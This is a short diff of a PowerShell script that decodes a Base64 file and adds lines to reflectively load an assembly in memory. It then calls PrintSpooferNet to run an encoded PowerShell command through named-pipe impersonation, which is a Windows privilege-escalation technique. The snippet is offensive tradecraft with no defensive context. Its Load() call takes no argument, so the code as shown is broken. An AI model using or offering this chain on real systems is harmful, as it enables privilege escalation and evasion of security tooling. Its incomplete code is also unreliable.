@@ -1,1 +1,4 @@
 $decodedBytes = [System.Convert]::FromBase64String((Get-Content -Raw -Path "C:\path\to\output.txt"))
+
+[System.Reflection.Assembly]::Load()
+[PrintSpooferNet.Program]::Main(@("any_pipe_name", "powershell -enc <base64>"))
